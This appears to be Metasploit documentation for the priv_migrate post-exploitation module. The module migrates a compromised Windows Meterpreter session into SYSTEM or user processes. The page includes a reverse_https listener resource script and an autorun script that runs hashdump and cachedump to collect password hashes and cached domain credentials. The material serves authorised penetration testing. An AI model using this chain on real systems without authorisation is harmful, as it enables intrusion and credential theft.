## Overview
This module evaluates a Windows Meterpreter session's privileges and migrates the session accordingly. The purpose of this module is to enable the scripting of migrations post exploitation, which allows you to immediately run post modules that require system rights.  

You can use this module in situations where incoming sessions may have mixed rights levels and the session needs to be migrated appropriately for additional post modules to run. It is also useful in situations where migration needs to occur within a short period after the session is created. 

The types of migrations that occur are described below: 

- A session with admin rights is migrated to a system owned process. 
- A session with user rights is migrated to a user level process. If a specified user level process is not running, the module will spawn it and then migrate the session. 

This module is a nice addition to the beginning of an autorun script for post-Meterpreter session creation. An example of an autorun script is provided below.

## Module Options
- **ANAME** - This option allows you to specify a system level process that the module attempts to migrate to first if the session has admin rights. 
- **NAME** - This option allows you to specify the user level process that the module attempts to migrate to first if the session has user rights or if admin migration fails through all of the default processes.  
- **KILL** - This option allows you to kill the original process after a successful migration. The default value is FALSE.
- **NOFAIL** - This option allows you to specify whether or not the module will migrate the session into a user level process if admin level migration fails. If TRUE, this may downgrade priviliged shells. The default value is FALSE.

## Module Process
Here is the process that the module follows:

- Retrieves the privilege information for the current session.
- If the session has admin rights, it attempts to migrate to a system owned process in the following order:
    - ANAME (Module option, if specified)
    - services.exe
    - wininit.exe
    - svchost.exe
    - lsm.exe
    - lsass.exe
    - winlogon.exe
- The module will not migrate if the session has System rights and is already in one of the above target processes.
- If it is unable to migrate to one of these processes, it drops to user level migration if NOFAIL is TRUE.
- If the session has user rights, it attempts to migrate to a user owned process in the following order:  
    - NAME (Module option, if specified)
    - explorer.exe
    - notepad.exe
- If it cannot migrate, it attempts to spawn the process and migrates to the newly spawned process.

## Using This Module with AutoRun Scripts
The use of autorun scripts with this module is an easy way to automate post-exploitation for incoming Meterpreter sessions. The following section describes the basic setup information and provides a script example to show how this module comes in handy.

### Basic Setup Information
Resource file (.rc) scripts can be used to automate many processes in Metasploit, particularly starting up the  console and running scripts once a session is created.

Startup scripts are executed using the following example where startup.rc is the startup script, and it is located in the user's home directory. Startup scripts are executed once the Metasploit Framework is loaded.

```
./msfconsole -r /home/user/startup.rc
```

The following is an example startup script that fires up a Meterpreter listener and specifies an autorun script that will be executed when a new session is created. In this example auto.rc is the script to be run after session creation.

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 192.168.1.101
set LPORT 13002
set ExitOnSession false
set AutoRunScript multi_console_command -r /home/user/auto.rc
exploit -j
```

### AutoRun Script Example
This example is a script that will use priv_migrate to migrate the session based on session rights. After migration, it executes modules that will retrieve user password hashes and cached domain hashes. Each one of the hash dump modules requires system rights to be successful. Priv_migrate makes it possible to execute these modules in an autorun script. For sessions with user rights, the hash dump modules will fail, but that is unlikely to impact the state of the session.

```
run post/windows/manage/priv_migrate
run post/windows/gather/hashdump
run post/windows/gather/cachedump
```
